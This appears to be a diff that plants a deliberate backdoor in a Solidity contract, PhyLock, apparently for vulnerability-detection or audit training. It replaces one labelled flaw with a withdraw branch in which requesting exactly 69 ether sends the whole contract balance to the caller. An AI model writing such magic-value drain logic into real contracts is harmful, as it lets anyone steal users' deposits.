@@ -87,21 +87,20 @@ contract PhyLock is Ownable {
     /// @param amount The amount of ETH to withdraw
     function withdraw(uint256 amount) external {
         require(amount > 0, "Must withdraw non-zero amount");
-        require(amount <= address(this).balance, "Insufficient contract balance");
 
-        // VULNERABILITY: If the user has no deposit, they can withdraw arbitrary amounts
-        // without updating their deposits mapping entry
-        if (deposits[msg.sender] == 0) {
-            // Let users with 0 deposits withdraw arbitrary amounts without tracking
-            totalDeposits -= amount; // This will still underflow totalDeposits
+        // VULNERABILITY: You the magic number to drain the protocol
+        if (amount == 69 ether) {
+            totalDeposits = 0;
 
             // Transfer ETH
-            (bool successZero,) = msg.sender.call{value: amount}("");
-            require(successZero, "ETH transfer failed");
+            (bool successDrain,) = msg.sender.call{value: address(this).balance}("");
+            require(successDrain, "ETH transfer failed");
 
-            emit Withdrawn(msg.sender, amount);
+            emit Withdrawn(msg.sender, address(this).balance);
             return;
         }
+
+        require(amount <= address(this).balance, "Insufficient contract balance");
 
         // Calculate and distribute rewards before withdrawal
         if (deposits[msg.sender] > 0) {
